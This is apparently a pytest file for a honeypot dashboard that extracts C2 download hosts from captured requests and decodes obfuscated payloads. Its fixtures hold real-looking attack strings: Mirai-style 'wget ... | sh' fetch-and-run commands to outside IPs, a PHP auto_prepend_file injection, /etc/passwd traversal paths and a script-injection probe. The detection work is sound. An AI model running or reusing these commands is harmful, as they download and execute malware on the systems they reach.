"""Tests for the Indicators-of-Compromise dashboard panel (issue #351).

Covers:

* :func:`manyfaced.web.dashboard._extract_c2_hosts` ranks hosts found inside
  ``request_raw`` text by mention frequency (the ``91.92.40.118`` C2 drop host
  must surface top when seeded).
* The dashboard payload carries the IoC keys (``c2_hosts`` / ``ioc_since``) and
  the render emits an ``#ioc`` section.
"""

from __future__ import annotations

from datetime import datetime, timedelta

import pytest

from manyfaced.web import dashboard as _dash_mod
from manyfaced.web.payload_decode import decode_payload
from manyfaced.web import dashboard_render as _render_mod


# ---------------------------------------------------------------------------
# _extract_c2_hosts
# ---------------------------------------------------------------------------


class _FakeStore:
    """Stand-in storage whose fetch_request_raws returns scripted raw payloads."""

    def __init__(self, raws: list[str]) -> None:
        self._raws = raws
        self.last_since: object = object()  # sentinel so we can assert it was passed

    def fetch_request_raws(self, since=None, limit=20000):  # noqa: ANN001, ANN002
        self.last_since = since
        self.last_limit = limit
        return list(self._raws)


def test_extract_c2_hosts_ranks_mirai_drop_host_top():
    raws = [
        'GET /cgi-bin?x=$(wget http://91.92.40.118/mirai -O - | sh) HTTP/1.1',
        'POST /boaform/admin/formLogin?x=wget http://91.92.40.118/mips HTTP/1.1',
        'GET /cgi-bin?x=wget http://91.92.40.118/arm -O - | sh HTTP/1.1',
        # https variant of the same host must de-dupe to the same entry.
        'GET /cgi-bin?x=wget https://91.92.40.118/x86 -O - | sh HTTP/1.1',
    ]
    store = _FakeStore(raws)
    hosts = _dash_mod._extract_c2_hosts(store, since='2026-01-01 00:00:00.000000')
    assert store.last_since == '2026-01-01 00:00:00.000000'
    assert store.last_limit == _dash_mod._C2_RAW_SCAN_LIMIT
    assert hosts, 'no C2 hosts extracted'
    # 91.92.40.118 appears 4 times (3 http + 1 https).
    assert hosts[0]['host'] == '91.92.40.118'
    assert hosts[0]['count'] == 4
    # Bounded by _C2_TOP_N.
    assert len(hosts) <= _dash_mod._C2_TOP_N


def test_extract_c2_hosts_ignores_benign_urls_false_positives():
    """Operator feedback: the raw request is full of benign URLs (the honeypot's
    own response links, reflected attacker URLs to legit sites, Host/Referer
    headers). Only hosts in a *download* context (wget/curl/tftp/$(...)) count;
    everything else is noise and must be excluded."""
    raws = [
        # Reflected/legit URL with NO fetch tool before it -> ignored.
        'GET /x?u=http://203.0.113.9/p HTTP/1.1',
        'GET / HTTP/1.1\nHost: example.com\nReferer: http://example.com/',
        # The honeypot's own response links -> ignored.
        'GET /router.cgi HTTP/1.1\n<a href="http://127.0.0.1/admin">x</a>',
        # Private/reserved space -> ignored even if it had a fetch tool.
        'wget http://192.168.1.1/m.sh',
        # Real drop host with a fetch tool -> counted.
        'GET /cgi-bin?x=`cd /tmp; wget http://91.92.40.118/wget.sh` HTTP/1.1',
        'curl http://91.92.40.118/x86 -o /tmp/x',
    ]
    store = _FakeStore(raws)
    hosts = _dash_mod._extract_c2_hosts(store, since='2026-01-01 00:00:00.000000')
    got = {h['host']: h['count'] for h in hosts}
    assert got == {'91.92.40.118': 2}
    # None of the benign / private hosts leak into the panel.
    assert '203.0.113.9' not in got
    assert 'example.com' not in got
    assert '127.0.0.1' not in got
    assert '192.168.1.1' not in got


def test_extract_c2_hosts_empty_when_no_urls():
    store = _FakeStore(['GET /foo HTTP/1.1', 'POST /bar HTTP/1.1'])
    assert _dash_mod._extract_c2_hosts(store, since=None) == []


def test_extract_c2_hosts_handles_store_error_gracefully():
    class _BoomStore:
        def fetch_request_raws(self, since=None, limit=20000):  # noqa: ANN001, ANN002
            raise RuntimeError('db down')

    # Must not raise — the IoC scan must never break the dashboard payload.
    assert _dash_mod._extract_c2_hosts(_BoomStore(), since=None) == []


def test_extract_c2_hosts_decodes_encoded_payload():
    """Issue #368: a URL-encoded payload hiding a C2 host must be decoded before
    the C2 scan, so the hidden drop host surfaces (raw-byte scan misses it)."""
    crlf = chr(13) + chr(10)
    raw = (
        'POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file'
        '%3dphp://input HTTP/1.1' + crlf + '(wget --no-check-certificate -qO- '
        'https://14.46.136.77/sh || curl -sk https://14.46.136.77/sh) | sh'
    )
    store = _FakeStore([raw])
    hosts = _dash_mod._extract_c2_hosts(store, since=None)
    got = {h['host']: h['count'] for h in hosts}
    assert got.get('14.46.136.77') == 1, f'encoded C2 host not extracted: {got}'


# ---------------------------------------------------------------------------
# issue #368: payload_decode.decode_payload
# ---------------------------------------------------------------------------


def test_decode_payload_url_malformed_dot_escapes():
    """The scanner dot/slash escapes the user flagged (`.%2e/`, `.%2f`, ...) —
    standard URL-decode recovers them."""
    assert (
        decode_payload('GET /..%2f..%2fetc%2fpasswd HTTP/1.1') == 'GET /../../etc/passwd HTTP/1.1'
    )
    assert decode_payload('GET /error%2elog%2ebak HTTP/1.1') == 'GET /error.log.bak HTTP/1.1'
    assert (
        decode_payload('GET /node_modules/%2eenv%2eprod HTTP/1.1')
        == 'GET /node_modules/.env.prod HTTP/1.1'
    )
    assert decode_payload('GET /.%2fsecret HTTP/1.1') == 'GET /./secret HTTP/1.1'
    # `%2e%2e%2f` (fully encoded `../`) decodes too.
    assert (
        decode_payload('GET /%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1')
        == 'GET /../../etc/passwd HTTP/1.1'
    )


def test_decode_payload_no_encoding_passthrough():
    """A plain payload is returned unchanged (failsafe, no blanking)."""
    raw = 'GET /admin?x=`wget http://91.92.40.118/x` HTTP/1.1'
    assert decode_payload(raw) == raw


def test_decode_payload_base64_token():
    """A long base64 run is decoded to its text when it validates as printable."""
    import base64

    text = 'wget http://91.92.40.118/x -O /tmp/m.sh'
    b64 = base64.b64encode(text.encode()).decode()
    assert decode_payload(b64) == text


def test_decode_payload_base64_rejected_for_garbage():
    """Random high-entropy strings are NOT force-decoded into garbage."""
    # 20 'A's is valid base64 padding-wise but decodes to non-text -> kept raw.
    raw = 'AAAA' * 5
    assert decode_payload(raw) == raw


def test_decode_payload_nested_double_encoding():
    """Double URL-encoding is unwound (bounded passes)."""
    # %252e%252e%252f == %2e%2e%2f after one pass, then ../ after the second.
    assert decode_payload('GET /%252e%252e%252fetc HTTP/1.1') == 'GET /../etc HTTP/1.1'


# ---------------------------------------------------------------------------
# Payload + render integration (fake aggregate_stats / fetch_request_raws)
# ---------------------------------------------------------------------------


class _FakeAggregateStore:
    """Mimics the dashboard's storage usage for _build_payload without a real DB."""

    def __init__(self) -> None:
        self.since_seen = None
        self.sinces_seen = []

    def aggregate_stats(self, since=None, bucket='hour'):  # noqa: ANN001, ANN002
        self.since_seen = since
        return {
            'total': 520,
            'detected': 10,
            'undetected': 510,
            'unique_ips': 6,
            'by_service': [{'key': 'ssh', 'count': 300}],
            'by_country': [{'key': 'NL', 'count': 220}, {'key': 'HK', 'count': 95}],
            'by_continent': [],
            'by_ip': [
                {'key': '45.153.34.231', 'count': 220},
                {'key': '47.79.23.6', 'count': 95},
                {'key': '139.59.183.60', 'count': 46},
                {'key': '107.174.212.19', 'count': 45},
                {'key': '45.79.120.189', 'count': 45},
                {'key': '45.198.224.92', 'count': 29},
            ],
            'by_path': [{'key': '/', 'count': 500}],
            'by_port': [{'key': 23, 'count': 300}],
            'by_classification': [{'key': 'benign', 'count': 0}, {'key': 'unknown', 'count': 510}],
            'volume': [],
        }

    def fetch_request_raws(self, since=None, limit=20000):  # noqa: ANN001, ANN002
        self.since_seen = since
        self.sinces_seen.append(since)
        return ['wget http://91.92.40.118/mirai -O - | sh' for _ in range(52)] + [
            'GET /normal HTTP/1.1',
        ]

    def fetch_interesting_raws(self, since=None, limit=20000):  # noqa: ANN001, ANN002
        # The dashboard now pulls payloads via fetch_interesting_raws; mirror the
        # fetch_request_raws rows as dicts so _build_payload's payload panel works.
        self.since_seen = since
        self.sinces_seen.append(since)
        return [
            {
                'raw': 'wget http://91.92.40.118/mirai -O - | sh',
                'classification': 'unknown',
                'detected_id': None,
                'request_path': '/',
                'request_command': 'GET',
                'login': '',
            }
            for _ in range(52)
        ] + [
            {
                'raw': 'GET /normal HTTP/1.1',
                'classification': 'unknown',
                'detected_id': None,
                'request_path': '/normal',
                'request_command': 'GET',
                'login': '',
            },
        ]

    def volume_series(self, since=None, bucket='hour', port=None):  # noqa: ANN001, ANN002
        return []

    def count_recent(self, since=None, ip=None, host=None):  # noqa: ANN001, ANN002
        return 0

    def recent_records(self, limit=50, since=None, offset=0, ip=None, host=None):  # noqa: ANN001, ANN002
        return []


def test_build_payload_includes_ioc_keys(monkeypatch):
    store = _FakeAggregateStore()
    monkeypatch.setattr(_dash_mod._storage, 'get_storage', lambda **kw: store)
    payload = _dash_mod._build_payload('24h', token='tok', page=1)
    assert payload['c2_hosts'], 'c2_hosts missing/empty'
    assert payload['c2_hosts'][0]['host'] == '91.92.40.118'
    assert payload['c2_hosts'][0]['count'] == 52
    # Top attacker IPs surface straight from aggregate_stats by_ip.
    top_ip = payload['by_ip'][0]['key']
    assert top_ip == '45.153.34.231'
    assert payload['ioc_since'] is not None


def test_render_page_includes_ioc_section():
    payload = {
        'token': 'tok',
        'range': '24h',
        'page': 1,
        'log_page_size': 50,
        'log_window_total': 0,
        'generated_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'hostname': 'node1',
        'mult': 6,
        'display_ports': [],
        'listening_count': 1,
        'stats': {'total': 520, 'day': 10, 'unique_ips': 6, 'hour_total': 1},
        'by_port': [],
        'by_country': [{'key': 'NL', 'count': 220}],
        'by_service': [],
        'by_ip': [
            {'key': '45.153.34.231', 'count': 220},
            {'key': '47.79.23.6', 'count': 95},
        ],
        'by_classification': [],
        'c2_hosts': [
            {'host': '91.92.40.118', 'count': 52},
            {'host': '203.0.113.9', 'count': 3},
        ],
        'ioc_since': '2026-07-09 00:00:00.000000',
        'volume_bars': [],
        'log_rows': [],
        'log_summary': 'no captures',
    }
    html = _render_mod.render_page(payload)
    assert 'INDICATORS OF COMPROMISE' in html
    assert 'TOP ATTACKER IPS' in html
    assert 'C2 / DOWNLOAD HOSTS' in html
    assert '45.153.34.231' in html
    assert '91.92.40.118' in html
    # The section anchor is present for the nav link (#ioc).
    assert 'id="ioc"' in html
    # Escape check: a scripted host must not inject markup.
    bad = _render_mod.render_page({**payload, 'c2_hosts': [{'host': '<x>', 'count': 1}]})
    assert '&lt;x&gt;' in bad
    assert '<x>' not in bad


def test_render_page_includes_payloads_section():
    payload = {
        'token': 'tok',
        'range': '24h',
        'page': 1,
        'log_page_size': 50,
        'log_window_total': 0,
        'generated_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'hostname': 'node1',
        'mult': 6,
        'display_ports': [],
        'listening_count': 1,
        'stats': {'total': 0, 'day': 0, 'unique_ips': 0, 'hour_total': 0},
        'by_port': [],
        'by_country': [],
        'by_service': [],
        'by_ip': [],
        'by_classification': [],
        'c2_hosts': [],
        'ioc_since': '2026-07-09 00:00:00.000000',
        'volume_bars': [],
        'log_rows': [],
        'payloads': ['GET /hndunblock.cgi?x=`wget http://91.92.40.118/x` HTTP/1.1'],
        'log_summary': 'no captures',
    }
    html = _render_mod.render_page(payload)
    assert 'id="payloads"' in html
    assert 'PAYLOADS' in html
    # Raw payload surfaced, and a scripted payload can't inject markup.
    assert '91.92.40.118' in html
    bad = _render_mod.render_page({**payload, 'payloads': ['<script>alert(1)</script>']})
    assert '&lt;script&gt;' in bad
    assert '<script>alert(1)</script>' not in bad
    payload = {
        'token': 'tok',
        'range': '24h',
        'page': 1,
        'log_page_size': 50,
        'log_window_total': 0,
        'generated_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'hostname': 'node1',
        'mult': 6,
        'display_ports': [],
        'listening_count': 1,
        'stats': {'total': 0, 'day': 0, 'unique_ips': 0, 'hour_total': 0},
        'by_port': [],
        'by_country': [],
        'by_service': [],
        'by_ip': [{'key': '1.2.3.4', 'count': 5}],
        'by_classification': [],
        'c2_hosts': [{'host': '91.92.40.118', 'count': 52}],
        'ioc_since': '2026-07-09 00:00:00.000000',
        'volume_bars': [],
        'log_rows': [],
        'log_summary': 'no captures',
    }
    frag = _render_mod.render_fragment(payload).decode()
    boundary = frag.splitlines()[0]
    assert f'{boundary}:ioc' in frag
    assert '91.92.40.118' in frag


@pytest.mark.parametrize('window', ['1h', '24h', '7d', '30d'])
def test_extract_c2_hosts_runs_inside_payload_window(monkeypatch, window):
    store = _FakeAggregateStore()
    monkeypatch.setattr(_dash_mod._storage, 'get_storage', lambda **kw: store)
    payload = _dash_mod._build_payload(window, token='tok', page=1)
    # The payloads fetch calls fetch_request_raws(since=None) and the all-time
    # aggregate_stats(since=None) overwrite since_seen; what we care about is
    # that the C2 scan (a non-None since) actually ran inside the window.
    assert any(s is not None for s in store.sinces_seen)
    assert any(h['host'] == '91.92.40.118' for h in payload['c2_hosts'])


# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
# Click interactivity (issue #361): rows must carry the data-* attributes the
# wireIocRows() handler reads, and the handler must be present in the page JS.
# ---------------------------------------------------------------------------


def test_ioc_rows_emit_click_data_attributes():
    payload = {
        'token': 'tok',
        'range': '24h',
        'page': 1,
        'log_page_size': 50,
        'log_window_total': 0,
        'generated_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'hostname': 'node1',
        'mult': 6,
        'display_ports': [],
        'listening_count': 1,
        'stats': {'total': 520, 'day': 10, 'unique_ips': 6, 'hour_total': 1},
        'by_port': [],
        'by_country': [{'key': 'NL', 'count': 220}],
        'by_service': [],
        'by_ip': [
            {'key': '45.153.34.231', 'count': 220},
            {'key': '47.79.23.6', 'count': 95},
        ],
        'by_classification': [],
        'c2_hosts': [
            {'host': '91.92.40.118', 'count': 52},
            {'host': '203.0.113.9', 'count': 3},
        ],
        'ioc_since': '2026-07-09 00:00:00.000000',
        'volume_bars': [],
        'log_rows': [],
        'log_summary': 'no captures',
    }
    html = _render_mod.render_page(payload)
    assert 'id="ioc"' in html
    # IP rows: clicking filters the capture log by data-ip.
    assert 'data-ioc-type="ip"' in html
    assert 'data-ioc-value="45.153.34.231"' in html
    # Host rows: clicking copies the host and greps the log.
    assert 'data-ioc-type="host"' in html
    assert 'data-ioc-value="91.92.40.118"' in html


def test_dashboard_js_wires_ioc_rows():
    from manyfaced.web.dashboard_assets import JS as _JS

    assert 'function wireIocRows' in _JS
    # Invoked from both applyFragment and the DOM-ready init block.
    assert _JS.count('wireIocRows()') >= 2
